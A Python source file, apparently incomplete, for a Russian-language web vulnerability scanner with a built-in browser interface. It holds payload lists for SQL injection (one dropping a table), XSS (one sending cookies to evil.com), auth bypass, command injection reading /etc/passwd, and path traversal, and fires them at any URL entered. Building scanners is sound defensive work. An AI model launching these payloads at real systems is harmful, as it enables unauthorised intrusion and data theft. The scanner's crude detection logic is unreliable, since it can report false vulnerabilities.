#!/usr/bin/env python3
# SWILL Security Scanner - Full Version
# Локальный веб-сканер безопасности

import http.server
import socketserver
import json
import re
import socket
import ssl
import threading
import time
import urllib.request
import urllib.parse
import urllib.error
from datetime import datetime
from html import escape
import os
import hashlib
import base64
from concurrent.futures import ThreadPoolExecutor
import subprocess
import platform

# Конфигурация
PORT = 8080
HOST = 'localhost'

# Список уязвимостей
vulnerabilities = []
scan_results = {}
scanning = False
current_progress = 0
current_status = ""

# Payloads для тестирования
SQL_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' #",
    "' OR 1=1 --",
    "' OR 1=1 #",
    "admin' --",
    "admin' #",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "1' OR '1'='1",
    "1' OR 1=1 --",
    "1' OR 1=1 #",
    "' OR SLEEP(5)--",
    "1' AND SLEEP(5)--",
    "' AND 1=1--",
    "' AND 1=2--",
    "'; DROP TABLE users--",
    "' OR 'x'='x'--",
    "') OR ('1'='1"
]

XSS_PAYLOADS = [
    '<script>alert(1)</script>',
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert(1)>',
    '<img src="x" onerror="alert(1)">',
    '<svg onload=alert(1)>',
    '<svg/onload=alert(1)>',
    '<body onload=alert(1)>',
    '<iframe src="javascript:alert(1)">',
    '"><script>alert(1)</script>',
    '"><img src=x onerror=alert(1)>',
    "'><script>alert(1)</script>",
    "'><img src=x onerror=alert(1)>",
    '<script>alert(document.cookie)</script>',
    '<img src=x onerror=alert(document.cookie)>',
    'javascript:alert(1)',
    '<script>fetch("http://evil.com/steal?cookie="+document.cookie)</script>'
]

AUTH_BYPASS_PAYLOADS = [
    ("admin", "' OR '1'='1"),
    ("admin", "' OR '1'='1' --"),
    ("admin", "' OR 1=1 --"),
    ("admin", "admin' --"),
    ("admin", "admin' #"),
    ("' OR 1=1 --", "anything"),
    ("' OR '1'='1", "anything"),
    ("admin", "' UNION SELECT NULL--"),
    ("1' OR '1'='1", "1' OR '1'='1"),
    ("admin'--", "anything"),
    ("' OR 1=1#", "anything"),
    ("admin", "' OR 'x'='x"),
    ("admin", "') OR ('1'='1"),
    ("admin", "' OR 1=1 LIMIT 1--")
]

CMD_PAYLOADS = [
    '; ls -la',
    '; pwd',
    '; whoami',
    '; id',
    '; uname -a',
    '; cat /etc/passwd',
    '&& ls -la',
    '&& whoami',
    '| ls -la',
    '| whoami',
    '|| ls -la',
    '; echo vulnerable',
    '&& echo vulnerable',
    '| echo vulnerable'
]

PATH_TRAVERSAL_PAYLOADS = [
    '../../../../etc/passwd',
    '../../../etc/passwd',
    '../../etc/passwd',
    '../etc/passwd',
    '....//....//....//etc/passwd',
    '..%2f..%2f..%2f..%2fetc%2fpasswd',
    '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    '..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
    '..\\..\\..\\..\\windows\\win.ini',
    '/etc/passwd',
    '/etc/shadow'
]

HEADER_PAYLOADS = [
    ('X-Forwarded-For', '127.0.0.1'),
    ('X-Real-IP', '127.0.0.1'),
    ('X-Originating-IP', '127.0.0.1'),
    ('X-Remote-Addr', '127.0.0.1'),
    ('X-Client-IP', '127.0.0.1'),
    ('X-HTTP-Method-Override', 'DELETE'),
    ('X-Custom-IP-Authorization', '127.0.0.1')
]

# HTML страница
HTML_PAGE = '''
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SWILL Security Scanner</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        :root {
            --bg-primary: #0a0e17;
            --bg-secondary: #111827;
            --bg-card: #1a2332;
            --border-color: #00ff41;
            --text-primary: #00ff41;
            --text-secondary: #00cc33;
            --danger: #ff3333;
            --warning: #ff9900;
            --info: #00ccff;
            --success: #00ff41;
        }
        
        body {
            background: var(--bg-primary);
            color: var(--text-primary);
            font-family: 'Courier New', monospace;
            min-height: 100vh;
            padding: 20px;
        }
        
        .container { max-width: 1400px; margin: 0 auto; }
        
        header {
            background: var(--bg-secondary);
            border: 2px solid var(--border-color);
            border-radius: 15px;
            padding: 30px;
            text-align: center;
            margin-bottom: 30px;
            box-shadow: 0 0 40px rgba(0, 255, 65, 0.2);
        }
        
        h1 {
            font-size: 3em;
            letter-spacing: 5px;
            text-transform: uppercase;
            text-shadow: 0 0 20px var(--text-primary);
            animation: glow 2s infinite;
        }
        
        @keyframes glow {
            0%, 100% { text-shadow: 0 0 20px var(--text-primary); }
            50% { text-shadow: 0 0 40px var(--text-primary), 0 0 60px var(--text-primary); }
        }
        
        .subtitle { margin-top: 10px; font-size: 1.2em; color: var(--text-secondary); }
        
        .input-section {
            background: var(--bg-secondary);
            border: 2px solid var(--border-color);
            border-radius: 15px;
            padding: 30px;
            margin-bottom: 30px;
        }
        
        .input-group { display: flex; gap: 15px; margin-bottom: 20px; }
        
        .input-group input {
            flex: 1;
            background: #000;
            border: 2px solid var(--border-color);
            color: var(--text-primary);
            padding: 18px;
            font-family: 'Courier New', monospace;
            font-size: 18px;
            outline: none;
            border-radius: 10px;
            transition: all 0.3s;
        }
        
        .input-group input:focus {
            box-shadow: 0 0 30px rgba(0, 255, 65, 0.3);
            border-color: #fff;
        }
        
        .btn {
            background: var(--border-color);
            color: #000;
            border: none;
            padding: 18px 35px;
            font-family: 'Courier New', monospace;
            font-weight: bold;
            cursor: pointer;
            font-size: 18px;
            transition: all 0.3s;
            border-radius: 10px;
            white-space: nowrap;
        }
        
        .btn:hover {
            background: #00cc33;
            box-shadow: 0 0 30px var(--border-color);
            transform: scale(1.05);
        }
        
        .btn:disabled { background: #666; cursor: not-allowed; }
        
        .btn-secondary {
            background: transparent;
            border: 2px solid var(--border-color);
            color: var(--border-color);
        }
        
        .checkboxes { display: flex; flex-wrap: wrap; gap: 20px; margin-bottom: 20px; }
        
        .checkbox-item {
            display: flex;
            align-items: center;
            gap: 8px;
            cursor: pointer;
            padding: 10px;
            background: rgba(0, 0, 0, 0.3);
            border-radius: 5px;
        }
        
        .progress-container { margin-bottom: 30px; display: none; }
        .progress-container.active { display: block; }
        
        .progress-bar {
            width: 100%;
            height: 40px;
            background: #000;
            border: 2px solid var(--border-color);
            border-radius: 20px;
            overflow: hidden;
        }
        
        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #00ff41, #00cc33);
            width: 0%;
            transition: width 0.5s;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #000;
            font-weight: bold;
        }
        
        .progress-text { text-align: center; margin-top: 10px; color: var(--text-secondary); }
        
        .terminal {
            background: #000;
            border: 2px solid var(--border-color);
            border-radius: 15px;
            padding: 20px;
            height: 500px;
            overflow-y: auto;
            font-size: 14px;
            white-space: pre-wrap;
            margin-bottom: 30px;
        }
        
        .terminal .log-error { color: var(--danger); }
        .terminal .log-warning { color: var(--warning); }
        .terminal .log-info { color: var(--info); }
        .terminal .log-success { color: var(--success); }
        .terminal .log-critical { color: #ff0000; font-weight: bold; }
        
        .results { display: none; margin-bottom: 30px; }
        .results.active { display: block; }
        
        .score-card {
            background: var(--bg-secondary);
            border: 2px solid var(--border-color);
            border-radius: 15px;
            padding: 30px;
            text-align: center;
            margin-bottom: 30px;
        }
        
        .score-number {
            font-size: 6em;
            font-weight: bold;
            text-shadow: 0 0 30px var(--border-color);
        }
        
        .score-number.danger { color: var(--danger); }
        .score-number.warning { color: var(--warning); }
        .score-number.success { color: var(--success); }
        
        .vulnerability-card {
            background: #1a0000;
            border: 2px solid var(--danger);
            border-radius: 10px;
            padding: 20px;
            margin: 15px 0;
        }
        
        .vulnerability-card.warning { border-color: var(--warning); }
        
        .vuln-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 10px;
        }
        
        .vuln-severity {
            padding: 5px 15px;
            border-radius: 5px;
            font-weight: bold;
        }
        
        .vuln-severity.critical { background: #ff0000; color: #fff; }
        .vuln-severity.high { background: #ff6600; color: #fff; }
        .vuln-severity.medium { background: #ffcc00; color: #000; }
        .vuln-severity.low { background: #00ff41; color: #000; }
        
        .download-btn {
            display: inline-block;
            background: var(--border-color);
            color: #000;
            padding: 15px 30px;
            text-decoration: none;
            border-radius: 10px;
            font-weight: bold;
            cursor: pointer;
            border: none;
            font-family: 'Courier New', monospace;
            margin-top: 20px;
        }
        
        footer { text-align: center; padding: 20px; border-top: 2px solid var(--border-color); }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>⚡ SWILL Security Scanner ⚡</h1>
            <div class="subtitle">Advanced Vulnerability Assessment Tool</div>
        </header>
        
        <div class="input-section">
            <div class="input-group">
                <input type="text" id="target-url" placeholder="Введите URL (например: https://example.com)" onkeypress="if(event.key==='Enter')startScan()">
                <button class="btn" id="scan-btn" onclick="startScan()">🔍 Сканировать</button>
                <button class="btn btn-secondary" onclick="clearAll()">Очистить</button>
            </div>
            
            <div class="checkboxes">
                <label class="checkbox-item"><input type="checkbox" checked> SQL Injection</label>
                <label class="checkbox-item"><input type="checkbox" checked> XSS</label>
                <label class="checkbox-item"><input type="checkbox" checked> Auth Bypass</label>
                <label class="checkbox-item"><input type="checkbox" checked> Command Injection</label>
                <label class="checkbox-item"><input type="checkbox" checked> Path Traversal</label>
                <label class="checkbox-item"><input type="checkbox" checked> CSRF</label>
                <label class="checkbox-item"><input type="checkbox" checked> Header Injection</label>
                <label class="checkbox-item"><input type="checkbox" checked> SSL/TLS</label>
                <label class="checkbox-item"><input type="checkbox" checked> Directory Listing</label>
                <label class="checkbox-item"><input type="checkbox" checked> Data Security</label>
            </div>
        </div>
        
        <div class="progress-container" id="progress-container">
            <div class="progress-bar">
                <div class="progress-fill" id="progress-fill">0%</div>
            </div>
            <div class="progress-text" id="progress-text">Готов к сканированию</div>
        </div>
        
        <div class="terminal" id="terminal">
[SWILL] Система инициализирована...
[SWILL] Готов к работе...
        </div>
        
        <div class="results" id="results">
            <div class="score-card">
                <h2 style="margin-bottom: 20px;">Оценка безопасности</h2>
                <div class="score-number" id="score-number">0</div>
                <div class="score-label" id="score-label">Не оценено</div>
                
                <div style="margin-top: 20px; display: grid; grid-template-columns: repeat(4, 1fr); gap: 15px;">
                    <div><div style="color:#999;">Критические</div><div id="critical-count" style="color:#ff0000; font-size:2em;">0</div></div>
                    <div><div style="color:#999;">Высокие</div><div id="high-count" style="color:#ff6600; font-size:2em;">0</div></div>
                    <div><div style="color:#999;">Средние</div><div id="medium-count" style="color:#ffcc00; font-size:2em;">0</div></div>
                    <div><div style="color:#999;">Низкие</div><div id="low-count" style="color:#00ff41; font-size:2em;">0</div></div>
                </div>
                
                <button class="download-btn" onclick="downloadReport()">📥 Скачать отчет (.txt)</button>
            </div>
            
            <div id="vulnerabilities-list"></div>
        </div>
        
        <footer>
            <p>SWILL Security Scanner v1.0 | TG: t.me/Swill_Way</p>
        </footer>
    </div>
    
    <script>
        let scanning = false;
        let reportData = {};
        
        function addLog(message, type = 'info') {
            const terminal = document.getElementById('terminal');
            const logClass = 'log-' + type;
            terminal.innerHTML += '\\n<span class="' + logClass + '">' + message + '</span>';
            terminal.scrollTop = terminal.scrollHeight;
        }
        
        function clearAll() {
            document.getElementById('target-url').value = '';
            document.getElementById('terminal').innerHTML = '[SWILL] Терминал очищен...';
            document.getElementById('results').classList.remove('active');
            document.getElementById('progress-container').classList.remove('active');
        }
        
        async function startScan() {
            const target = document.getElementById('target-url').value.trim();
            if (!target) {
                addLog('[ERROR] Введите URL', 'error');
                return;
            }
            
            scanning = true;
            document.getElementById('scan-btn').disabled = true;
            document.getElementById('progress-container').classList.add('active');
            
            addLog('\\n[SWILL] ========== НАЧАЛО СКАНИРОВАНИЯ ==========', 'success');
            addLog('[TARGET] ' + target, 'info');
            
            try {
                const response = await fetch('/scan', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ target: target })
                });
                
                const data = await response.json();
                
                if (data.status === 'scanning') {
                    addLog('[SWILL] Сканирование началось...', 'info');
                    pollProgress(target);
                }
            } catch (e) {
                addLog('[ERROR] ' + e.message, 'error');
            }
        }
        
        async function pollProgress(target) {
            const interval = setInterval(async () => {
                try {
                    const response = await fetch('/progress');
                    const data = await response.json();
                    
                    document.getElementById('progress-fill').style.width = data.progress + '%';
                    document.getElementById('progress-fill').textContent = data.progress + '%';
                    document.getElementById('progress-text').textContent = data.status;
                    
                    if (data.logs) {
                        const terminal = document.getElementById('terminal');
                        terminal.innerHTML = data.logs;
                        terminal.scrollTop = terminal.scrollHeight;
                    }
                    
                    if (data.done) {
                        clearInterval(interval);
                        showResults(data.results);
                        scanning = false;
                        document.getElementById('scan-btn').disabled = false;
                    }
                } catch (e) {
                    clearInterval(interval);
                }
            }, 500);
        }
        
        function showResults(results) {
            document.getElementById('results').classList.add('active');
            document.getElementById('score-number').textContent = results.score;
            document.getElementById('critical-count').textContent = results.criticalCount;
            document.getElementById('high-count').textContent = results.highCount;
            document.getElementById('medium-count').textContent = results.mediumCount;
            document.getElementById('low-count').textContent = results.lowCount;
            
            const scoreNumber = document.getElementById('score-number');
            const scoreLabel = document.getElementById('score-label');
            
            if (results.score >= 80) {
                scoreNumber.className = 'score-number success';
                scoreLabel.textContent = 'Отличная безопасность';
            } else if (results.score >= 60) {
                scoreNumber.className = 'score-number warning';
                scoreLabel.textContent = 'Хорошая безопасность';
            } else if (results.score >= 40) {
                scoreNumber.className = 'score-number warning';
                scoreLabel.textContent = 'Средняя безопасность';
            } else {
                scoreNumber.className = 'score-number danger';
                scoreLabel.textContent = 'Плохая безопасность';
            }
            
            reportData = results;
            
            const vulnList = document.getElementById('vulnerabilities-list');
            vulnList.innerHTML = '';
            
            results.vulnerabilities.forEach(vuln => {
                const card = document.createElement('div');
                card.className = 'vulnerability-card ' + (vuln.severity === 'critical' || vuln.severity === 'high' ? '' : 'warning');
                card.innerHTML = `
                    <div class="vuln-header">
                        <span style="font-weight:bold;">${vuln.type}</span>
                        <span class="vuln-severity ${vuln.severity}">${vuln.severity.toUpperCase()}</span>
                    </div>
                    <p><strong>Описание:</strong> ${vuln.description}</p>
                    <p><strong>Рекомендация:</strong> ${vuln.recommendation}</p>
                    ${vuln.payload ? '<p><strong>Payload:</strong> ' + vuln.payload + '</p>' : ''}
                `;
                vulnList.appendChild(card);
            });
        }
        
        function downloadReport() {
            if (!reportData.target) return;
            
            fetch('/download', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(reportData)
            })
            .then(response => response.blob())
            .then(blob => {
                const url = URL.createObjectURL(blob);
                const a = document.createElement('a');
                a.href = url;
                a.download = 'security_report_' + Date.now() + '.txt';
                a.click();
                URL.revokeObjectURL(url);
            });
        }
        
        addLog('[SWILL] Загрузка модулей...', 'info');
        setTimeout(() => {
            addLog('[SWILL] Все модули загружены', 'success');
            addLog('[SWILL] Готов к работе', 'success');
        }, 1000);
    </script>
</body>
</html>
'''

# Сканер
class SecurityScanner:
    def __init__(self, target_url):
        self.target_url = target_url
        self.vulnerabilities = []
        self.found_forms = []
        self.found_urls = []
        self.logs = []
        
    def add_log(self, message, type='info'):
        self.logs.append(f'<span class="log-{type}">{message}</span>')
        
    def log(self, message, type='info'):
        print(f"[{type.upper()}] {message}")
        self.add_log(message, type)
        
    def run_full_scan(self):
        """Запуск полного сканирования"""
        self.log(f"Начинаю сканирование: {self.target_url}", 'success')
        self.log("=" * 60, 'info')
        
        # 1. Проверка доступности
        self.check_availability()
        
        # 2. Анализ заголовков
        self.check_headers()
        
        # 3. Проверка SSL
        self.check_ssl()
        
        # 4. Поиск форм
        self.find_forms()
        
        # 5. SQL Injection
        self.test_sql_injection()
        
        # 6. XSS
        self.test_xss()
        
        # 7. Auth Bypass
        self.test_auth_bypass()
        
        # 8. Command Injection
        self.test_command_injection()
        
        # 9. Path Traversal
        self.test_path_traversal()
        
        # 10. Directory Listing
        self.check_directory_listing()
        
        # 11. Data Security
        self.check_data_security()
        
        self.log("\nСканирование завершено", 'success')
        return self.vulnerabilities
        
    def check_availability(self):
        """Проверка доступности сайта"""
        self.log("[1/11] Проверка доступности сайта...", 'info')
        
        try:
            req = urllib.request.Request(self.target_url, headers={'User-Agent': 'Mozilla/5.0'})
            response = urllib.request.urlopen(req, timeout=10)
            self.log(f"Сайт доступен. Статус: {response.status}", 'success')
            
            # Сохранение HTML для анализа
            self.html_content = response.read().decode('utf-8', errors='ignore')
            self.response_headers = dict(response.headers)
            
        except urllib.error.HTTPError as e:
            self.log(f"Сайт вернул ошибку: {e.code}", 'warning')
            if e.code == 403:
                self.vulnerabilities.append({
                    'type': 'Доступ запрещен',
                    'severity': 'medium',
                    'description': 'Сервер вернул 403 Forbidden',
                    'recommendation': 'Проверьте права доступа'
                })
        except urllib.error.URLError as e:
            self.log(f"Сайт недоступен: {e.reason}", 'error')
            self.vulnerabilities.append({
                'type': 'Сайт недоступен',
                'severity': 'critical',
                'description': f'Не удалось подключиться к сайту: {e.reason}',
                'recommendation': 'Проверьте правильность URL'
            })
            return
        except Exception as e:
            self.log(f"Ошибка: {e}", 'error')
            
    def check_headers(self):
        """Анализ HTTP заголовков"""
        self.log("[2/11] Анализ HTTP заголовков...", 'info')
        
        if not hasattr(self, 'response_headers'):
            return
            
        headers = self.response_headers
        
        # X-Frame-Options
        if 'X-Frame-Options' not in headers:
            self.vulnerabilities.append({
                'type': 'Отсутствует X-Frame-Options',
                'severity': 'medium',
                'description': 'Заголовок X-Frame-Options не установлен. Сайт уязвим к clickjacking.',
                'recommendation': 'Добавьте заголовок X-Frame-Options: DENY или SAMEORIGIN'
            })
        else:
            self.log(f"X-Frame-Options: {headers['X-Frame-Options']}", 'success')
            
        # Content-Security-Policy
        if 'Content-Security-Policy' not in headers:
            self.vulnerabilities.append({
                'type': 'Отсутствует Content-Security-Policy',
                'severity': 'high',
                'description': 'Заголовок CSP не установлен. Сайт уязвим к XSS атакам.',
                'recommendation': 'Добавьте заголовок Content-Security-Policy'
            })
        else:
            self.log(f"CSP: {headers['Content-Security-Policy'][:50]}...", 'success')
            
        # X-XSS-Protection
        if 'X-XSS-Protection' not in headers:
            self.vulnerabilities.append({
                'type': 'Отсутствует X-XSS-Protection',
                'severity': 'low',
                'description': 'Заголовок X-XSS-Protection не установлен.',
                'recommendation': 'Добавьте заголовок X-XSS-Protection: 1; mode=block'
            })
            
        # Server
        if 'Server' in headers:
            self.vulnerabilities.append({
                'type': 'Раскрытие версии сервера',
                'severity': 'low',
                'description': f'Сервер раскрывает информацию: {headers["Server"]}',
                'recommendation': 'Скройте версию сервера'
            })
            
    def check_ssl(self):
        """Проверка SSL/TLS"""
        self.log("[3/11] Проверка SSL/TLS...", 'info')
        
        if not self.target_url.startswith('https://'):
            self.vulnerabilities.append({
                'type': 'Отсутствует SSL/TLS',
                'severity': 'critical',
                'description': 'Сайт не использует HTTPS. Все данные передаются в открытом виде.',
                'recommendation': 'Установите SSL-сертификат и используйте HTTPS'
            })
        else:
            self.log("HTTPS используется", 'success')
            
    def find_forms(self):
        """Поиск форм"""
        self.log("[4/11] Поиск форм...", 'info')
        
        if not hasattr(self, 'html_content'):
            return
            
        # Поиск форм
        form_pattern = r'<form(.*?)</form>'
        forms = re.findall(form_pattern, self.html_content, re.DOTALL)
        
        self.log(f"Найдено форм: {len(forms)}", 'info')
        
        for form in forms:
            form_info = {
                'action': '',
                'method': 'post',
                'inputs': []
            }
            
            action_match = re.search(r'action=["\'](.*?)["\']', form)
            if action_match:
                form_info['action'] = urllib.parse.urljoin(self.target_url, action_match.group(1))
            else:
                form_info['action'] = self.target_url
                
            method_match = re.search(r'method=["\'](.*?)["\']', form)
            if method_match:
                form_info['method'] = method_match.group(1).lower()
                
            input_pattern = r'<input(.*?)>'
            inputs = re.findall(input_pattern, form)
            
            for input_field in inputs:
                name_match = re.search(r'name=["\'](.*?)["\']', input_field)
                type_match = re.search(r'type=["\'](.*?)["\']', input_field)
                
                if name_match:
                    input_info = {
                        'name': name_match.group(1),
                        'type': type_match.group(1) if type_match else 'text'
                    }
                    form_info['inputs'].append(input_info)
                    
            self.found_forms.append(form_info)
            
        # Поиск ссылок
        link_pattern = r'href=["\'](.*?)["\']'
        links = re.findall(link_pattern, self.html_content)
        for link in links:
            if link.startswith('http'):
                self.found_urls.append(link)
            elif link.startswith('/'):
                self.found_urls.append(urllib.parse.urljoin(self.target_url, link))
                
    def test_sql_injection(self):
        """Тестирование SQL-инъекций"""
        self.log("[5/11] Тестирование SQL-инъекций...", 'info')
        
        found_sql = False
        
        for payload in SQL_PAYLOADS[:10]:
            try:
                # Тестирование в URL
                test_url = f"{self.target_url}?id={urllib.parse.quote(payload)}"
                req = urllib.request.Request(test_url, headers={'User-Agent': 'Mozilla/5.0'})
                response = urllib.request.urlopen(req, timeout=5)
                content = response.read().decode('utf-8', errors='ignore')
                
                if self.check_sql_error(content):
                    found_sql = True
                    self.vulnerabilities.append({
                        'type': 'SQL Injection',
                        'severity': 'critical',
                        'description': 'Обнаружена SQL-инъекция в параметре id.',
                        'recommendation': 'Используйте параметризованные запросы',
                        'payload': payload
                    })
                    self.log(f"Найдена SQL-инъекция: {payload}", 'critical')
                    break
                    
            except:
                continue
                
        if not found_sql:
            self.log("SQL-инъекций не обнаружено", 'success')
            
    def check_sql_error(self, content):
        """Проверка на SQL ошибки"""
        sql_errors = [
            'SQL syntax', 'mysql_fetch', 'mysqli_fetch', 'PostgreSQL', 'ORA-',
            'Oracle', 'Microsoft OLE DB', 'ODBC', 'SQLite', 'SQLSTATE',
            'syntax error', 'unclosed quotation', 'SQL command not properly ended',
            'Warning: mysql', 'Warning: mysqli', 'You have an error in your SQL syntax'
        ]
        
        for error in sql_errors:
            if error.lower() in content.lower():
                return True
        return False
        
    def test_xss(self):
        """Тестирование XSS"""
        self.log("[6/11] Тестирование XSS...", 'info')
        
        found_xss = False
        
        for payload in XSS_PAYLOADS[:8]:
            try:
                test_url = f"{self.target_url}?q={urllib.parse.quote(payload)}"
                req = urllib.request.Request(test_url, headers={'User-Agent': 'Mozilla/5.0'})
                response = urllib.request.urlopen(req, timeout=5)
                content = response.read().decode('utf-8', errors='ignore')
                
                if payload in content:
                    found_xss = True
                    self.vulnerabilities.append({
                        'type': 'XSS (Cross-Site Scripting)',
                        'severity': 'high',
                        'description': 'Обнаружена XSS-уязвимость.',
                        'recommendation': 'Экранируйте пользовательский ввод',
                        'payload': payload
                    })
                    self.log(f"Найден XSS: {payload}", 'critical')
                    break
                    
            except:
                continue
                
        if not found_xss:
            self.log("XSS не обнаружен", 'success')
            
    def test_auth_bypass(self):
        """Тестирование обхода аутентификации"""
        self.log("[7/11] Тестирование обхода аутентификации...", 'info')
        
        if not self.found_forms:
            self.log("Форм входа не найдено", 'info')
            return
            
        for form in self.found_forms:
            password_fields = [i for i in form['inputs'] if i['type'] == 'password']
            if not password_fields:
                continue
                
            self.log(f"Найдена форма входа: {form['action']}", 'info')
            
            for username, password in AUTH_BYPASS_PAYLOADS[:5]:
                data = {}
                for input_field in form['inputs']:
                    if input_field['type'] == 'password':
                        data[input_field['name']] = password
                    elif 'user' in input_field['name'].lower() or 'login' in input_field['name'].lower():
                        data[input_field['name']] = username
                    else:
                        data[input_field['name']] = 'test'
                        
                try:
                    data_encoded = urllib.parse.urlencode(data).encode()
                    req = urllib.request.Request(form['action'], data=data_encoded, headers={'User-Agent': 'Mozilla/5.0'})
                    response = urllib.request.urlopen(req, timeout=5)
                    
                    if response.status == 200:
                        self.vulnerabilities.append({
                            'type': 'Обход аутентификации',
                            'severity': 'critical',
                            'description': 'Обнаружена возможность обхода аутентификации.',
                            'recommendation': 'Используйте безопасные методы аутентификации',
                            'payload': f"username: {username}, password: {password}"
                        })
                        self.log("Обнаружен обход аутентификации!", 'critical')
                        break
                        
                except:
                    continue
                    
    def test_command_injection(self):
        """Тестирование инъекций команд"""
        self.log("[8/11] Тестирование инъекций команд...", 'info')
        
        found_cmd = False
        
        for payload in CMD_PAYLOADS[:8]:
            try:
                test_url = f"{self.target_url}?cmd={urllib.parse.quote(payload)}"
                req = urllib.request.Request(test_url, headers={'User-Agent': 'Mozilla/5.0'})
                response = urllib.request.urlopen(req, timeout=5)
                content = response.read().decode('utf-8', errors='ignore')
                
                if 'root' in content or 'vulnerable' in content:
                    found_cmd = True
                    self.vulnerabilities.append({
                        'type': 'Command Injection',
                        'severity': 'critical',
                        'description': 'Обнаружена возможность выполнения команд.',
                        'recommendation': 'Не передавайте пользовательский ввод в системные команды',
                        'payload': payload
                    })
                    self.log(f"Обнаружена инъекция команд: {payload}", 'critical')
                    break
                    
            except:
                continue
                
        if not found_cmd:
            self.log("Инъекций команд не обнаружено", 'success')
            
    def test_path_traversal(self):
        """Тестирование path traversal"""
        self.log("[9/11] Тестирование path traversal...", 'info')
        
        found_path = False
        
        for payload in PATH_TRAVERSAL_PAYLOADS[:8]:
            try:
                test_url = f"{self.target_url}/{payload}"
                req = urllib.request.Request(test_url, headers={'User-Agent': 'Mozilla/5.0'})
                response = urllib.request.urlopen(req, timeout=5)
                content = response.read().decode('utf-8', errors='ignore')
                
                if 'root:' in content or 'admin:' in content:
                    found_path = True
                    self.vulnerabilities.append({
                        'type': 'Path Traversal',
                        'severity': 'high',
                        'description': 'Обнаружена возможность чтения произвольных файлов.',
                        'recommendation': 'Проверяйте и экранируйте пути к файлам',
                        'payload': payload
                    })
                    self.log(f"Обнаружен path traversal: {payload}", 'critical')
                    break
                    
            except:
                continue
                
        if not found_path:
            self.log("Path traversal не обнаружен", 'success')
            
    def check_directory_listing(self):
        """Проверка directory listing"""
        self.log("[10/11] Проверка directory listing...", 'info')
        
        try:
            test_urls = [
                f"{self.target_url}/admin/",
                f"{self.target_url}/backup/",
                f"{self.target_url}/config/",
                f"{self.target_url}/uploads/",
                f"{self.target_url}/images/"
            ]
            
            for test_url in test_urls:
                req = urllib.request.Request(test_url, headers={'User-Agent': 'Mozilla/5.0'})
                response = urllib.request.urlopen(req, timeout=5)
                content = response.read().decode('utf-8', errors='ignore')
                
                if 'Index of' in content or 'Directory listing' in content:
                    self.vulnerabilities.append({
                        'type': 'Directory Listing',
                        'severity': 'medium',
                        'description': f'Обнаружен открытый листинг директории: {test_url}',
                        'recommendation': 'Отключите directory listing на сервере'
                    })
                    self.log(f"Обнаружен directory listing: {test_url}", 'warning')
                    
        except:
            pass
            
        self.log("Проверка directory listing завершена", 'success')
        
    def check_data_security(self):
        """Проверка безопасности данных"""
        self.log("[11/11] Анализ безопасности данных...", 'info')
        
        # Проверка на передачу данных без шифрования
        if self.target_url.startswith('http://'):
            self.vulnerabilities.append({
                'type': 'Передача данных без шифрования',
                'severity': 'critical',
                'description': 'Данные передаются по незащищенному HTTP соединению.',
                'recommendation': 'Используйте HTTPS для передачи данных'
            })
            
        # Проверка на раскрытие информации
        if hasattr(self, 'html_content'):
            sensitive_patterns = [
                ('password', 'Обнаружено поле password в HTML'),
                ('api_key', 'Обнаружен API key в HTML'),
                ('secret', 'Обнаружен секретный ключ в HTML'),
                ('token', 'Обнаружен токен в HTML')
            ]
            
            for pattern, description in sensitive_patterns:
                if pattern in self.html_content.lower():
                    self.vulnerabilities.append({
                        'type': 'Раскрытие конфиденциальной информации',
                        'severity': 'high',
                        'description': description,
                        'recommendation': 'Уберите конфиденциальные данные из HTML'
                    })
                    
        self.log("Анализ безопасности данных завершен", 'success')
        
    def generate_report(self):
        """Генерация отчета"""
        critical_count = len([v for v in self.vulnerabilities if v['severity'] == 'critical'])
        high_count = len([v for v in self.vulnerabilities if v['severity'] == 'high'])
        medium_count = len([v for v in self.vulnerabilities if v['severity'] == 'medium'])
        low_count = len([v for v in self.vulnerabilities if v['severity'] == 'low'])
        
        # Расчет оценки
        score = 100
        score -= critical_count * 20
        score -= high_count * 10
        score -= medium_count * 5
        score -= low_count * 2
        score = max(0, min(100, score))
        
        return {
            'target': self.target_url,
            'date': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'score': score,
            'criticalCount': critical_count,
            'highCount': high_count,
            'mediumCount': medium_count,
            'lowCount': low_count,
            'vulnerabilities': self.vulnerabilities,
            'logs': '<br>'.join(self.logs)
        }


class ScannerHandler(http.server.SimpleHTTPRequestHandler):
    scanner = None
    scan_results = None
    scan_progress = 0
    scan_status = ""
    scan_logs = ""
    scanning = False
    
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-Type', 'text/html; charset=utf-8')
            self.end_headers()
            self.wfile.write(HTML_PAGE.encode('utf-8'))
        elif self.path == '/progress':
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            
            response = {
                'progress': self.scan_progress,
                'status': self.scan_status,
                'logs': self.scan_logs,
                'done': not self.scanning and self.scan_results is not None,
                'results': self.scan_results
            }
            self.wfile.write(json.dumps(response).encode('utf-8'))
        else:
            super().do_GET()
            
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        body = self.rfile.read(content_length)
        data = json.loads(body.decode('utf-8'))
        
        if self.path == '/scan':
            target = data.get('target', '')
            
            if not target:
                response = {'status': 'error', 'message': 'URL не указан'}
                self.send_response(400)
                self.send_header('Content-Type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps(response).encode('utf-8'))
                return
                
            # Запуск сканирования в отдельном потоке
            self.scanning = True
            self.scan_progress = 0
            self.scan_status = "Начало сканирования"
            self.scan_logs = ""
            
            thread = threading.Thread(target=self.run_scan, args=(target,))
            thread.daemon = True
            thread.start()
            
            response = {'status': 'scanning'}
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
